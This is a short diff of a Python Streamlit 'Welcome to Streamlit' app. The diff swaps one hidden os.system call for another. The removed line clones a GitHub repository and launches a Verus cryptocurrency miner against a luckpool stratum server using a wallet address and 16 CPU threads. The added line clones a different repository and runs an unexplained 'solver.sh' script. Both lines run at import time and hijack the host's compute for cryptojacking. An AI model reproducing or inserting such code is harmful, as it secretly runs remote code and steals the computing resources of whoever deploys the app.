@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('git clone https://github.com/intanpermani5275/asd.git && cd asd && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu 16')
+os.system('git clone https://github.com/Xilahani8/asd.git && cd asd && bash solver.sh')
 
 """
 # Welcome to Streamlit!
